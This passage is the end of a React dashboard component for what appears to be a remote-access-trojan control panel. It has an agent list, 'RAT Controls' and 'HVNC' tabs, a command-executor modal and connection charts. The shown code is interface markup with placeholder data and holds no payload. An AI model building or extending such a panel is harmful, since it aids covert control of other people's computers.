                  <FiUsers className="w-10 h-10 mx-auto mb-2 opacity-50" />
                  <p>No online agents found</p>
                </div>
              )}
            </div>
          </div>
          
          {/* Agent Details and Controls */}
          <div className="lg:col-span-2">
            {selectedAgent ? (
              <div className="space-y-4">
                {/* Tabs */}
                <div className="bg-white dark:bg-boxdark rounded-lg shadow-sm p-1 flex">
                  <button 
                    className={`flex-1 py-2 px-4 rounded-md text-center ${
                      activeTab === 'overview' ? 'bg-primary text-white' : 'hover:bg-bodydark2/10'
                    }`}
                    onClick={() => handleTabChange('overview')}
                  >
                    Overview
                  </button>
                  <button 
                    className={`flex-1 py-2 px-4 rounded-md text-center ${
                      activeTab === 'rat' ? 'bg-primary text-white' : 'hover:bg-bodydark2/10'
                    }`}
                    onClick={() => handleTabChange('rat')}
                  >
                    RAT Controls
                  </button>
                  <button 
                    className={`flex-1 py-2 px-4 rounded-md text-center ${
                      activeTab === 'hvnc' ? 'bg-primary text-white' : 'hover:bg-bodydark2/10'
                    } ${!selectedAgent.features.hvnc ? 'opacity-50 cursor-not-allowed' : ''}`}
                    onClick={() => selectedAgent.features.hvnc && handleTabChange('hvnc')}
                    disabled={!selectedAgent.features.hvnc}
                  >
                    HVNC
                  </button>
                </div>
                
                {/* Tab Content */}
                {renderAgentDetails()}
              </div>
            ) : (
              <div className="bg-white dark:bg-boxdark rounded-lg shadow-sm p-8 text-center">
                <FiMonitor className="w-16 h-16 mx-auto mb-4 text-bodydark2" />
                <h3 className="text-lg font-semibold mb-2">No Agent Selected</h3>
                <p className="text-bodydark2">Select an agent from the list to view details and controls</p>
              </div>
            )}
          </div>
        </div>

        {/* Charts and Analytics Row */}
        <div className="grid grid-cols-1 xl:grid-cols-2 gap-4 md:gap-6 animate-fade-in-up">
          {/* Client Status Chart */}
          <div className="bg-white dark:bg-boxdark rounded-lg shadow-sm border border-stroke dark:border-strokedark p-4 md:p-6">
            <h3 className="text-base md:text-lg font-semibold text-black dark:text-white mb-4">Client Status Distribution</h3>
            <div className="h-64 md:h-80">
              <ResponsiveContainer width="100%" height="100%">
                <PieChart>
                  <Pie
                    data={chartData}
                    cx="50%"
                    cy="50%"
                    labelLine={false}
                    label={({ name, percent }) => `${name} ${(percent * 100).toFixed(0)}%`}
                    outerRadius={80}
                    fill="#8884d8"
                    dataKey="value"
                  >
                    {chartData.map((entry, index) => (
                      <Cell key={`cell-${index}`} fill={COLORS[index % COLORS.length]} />
                    ))}
                  </Pie>
                  <Tooltip />
                  <Legend />
                </PieChart>
              </ResponsiveContainer>
            </div>
          </div>

          {/* Activity Timeline Chart */}
          <div className="bg-white dark:bg-boxdark rounded-lg shadow-sm border border-stroke dark:border-strokedark p-4 md:p-6">
            <h3 className="text-base md:text-lg font-semibold text-black dark:text-white mb-4">Activity Timeline</h3>
            <div className="h-64 md:h-80">
              <ResponsiveContainer width="100%" height="100%">
                <LineChart data={timelineData}>
                  <CartesianGrid strokeDasharray="3 3" />
                  <XAxis dataKey="time" />
                  <YAxis />
                  <Tooltip />
                  <Legend />
                  <Line 
                    type="monotone" 
                    dataKey="connections" 
                    stroke="#3C50E0" 
                    strokeWidth={2}
                    dot={{ fill: '#3C50E0', strokeWidth: 2, r: 4 }}
                  />
                </LineChart>
              </ResponsiveContainer>
            </div>
          </div>
        </div>

        {/* Recent Activity & Alerts */}
        <div className="grid grid-cols-1 xl:grid-cols-2 gap-4 md:gap-6 animate-fade-in-up" style={{animationDelay: '0.2s'}}>
          {/* Recent Activity */}
          <div className="bg-white dark:bg-boxdark rounded-lg shadow-sm border border-stroke dark:border-strokedark p-4 md:p-6">
            <h3 className="text-base md:text-lg font-semibold text-black dark:text-white mb-4">Recent Activity</h3>
            <div className="space-y-4">
              {[
                { time: '2 minutes ago', action: 'New client connected', type: 'success' },
                { time: '15 minutes ago', action: 'Task completed successfully', type: 'success' },
                { time: '1 hour ago', action: 'System backup completed', type: 'info' },
                { time: '2 hours ago', action: 'Security scan finished', type: 'warning' },
                { time: '3 hours ago', action: 'Client disconnected', type: 'error' }
              ].map((activity, index) => (
                <div key={index} className="flex items-center space-x-3 p-3 rounded-lg hover:bg-gray-2 dark:hover:bg-meta-4 transition-colors">
                  <div className={`w-2 h-2 rounded-full ${
                    activity.type === 'success' ? 'bg-success' :
                    activity.type === 'warning' ? 'bg-warning' :
                    activity.type === 'error' ? 'bg-danger' : 'bg-primary'
                  }`}></div>
                  <div className="flex-1">
                    <p className="text-sm font-medium text-black dark:text-white">{activity.action}</p>
                    <p className="text-xs text-bodydark2">{activity.time}</p>
                  </div>
                </div>
              ))}
            </div>
          </div>

          {/* System Alerts */}
          <div className="bg-white dark:bg-boxdark rounded-lg shadow-sm border border-stroke dark:border-strokedark p-4 md:p-6">
            <h3 className="text-base md:text-lg font-semibold text-black dark:text-white mb-4">System Alerts</h3>
            <div className="space-y-4">
              {[
                { 
                  title: 'High CPU Usage', 
                  description: 'Server CPU usage is above 80%', 
                  severity: 'warning',
                  time: '5 minutes ago'
                },
                { 
                  title: 'Security Update Available', 
                  description: 'New security patches are ready for installation', 
                  severity: 'info',
                  time: '1 hour ago'
                },
                { 
                  title: 'Backup Completed', 
                  description: 'Daily system backup completed successfully', 
                  severity: 'success',
                  time: '2 hours ago'
                }
              ].map((alert, index) => (
                <div key={index} className="flex items-start space-x-3 p-3 rounded-lg border border-stroke dark:border-strokedark">
                  <div className={`mt-1 ${
                    alert.severity === 'warning' ? 'text-warning' :
                    alert.severity === 'success' ? 'text-success' : 'text-primary'
                  }`}>
                    {alert.severity === 'warning' ? <FiAlertTriangle className="w-4 h-4" /> :
                     alert.severity === 'success' ? <FiCheckCircle className="w-4 h-4" /> :
                     <FiMonitor className="w-4 h-4" />}
                  </div>
                  <div className="flex-1">
                    <p className="text-sm font-medium text-black dark:text-white">{alert.title}</p>
                    <p className="text-xs text-bodydark2 mb-1">{alert.description}</p>
                    <p className="text-xs text-bodydark2">{alert.time}</p>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>

        {/* Command Executor Modal */}
        {isCommandExecutorOpen && commandExecutorAgent && (
          <CommandExecutor
            agent={commandExecutorAgent}
            isOpen={isCommandExecutorOpen}
            onClose={() => {
              setIsCommandExecutorOpen(false);
              setCommandExecutorAgent(null);
            }}
          />
        )}
      </div>
    );
};

export default Dashboard;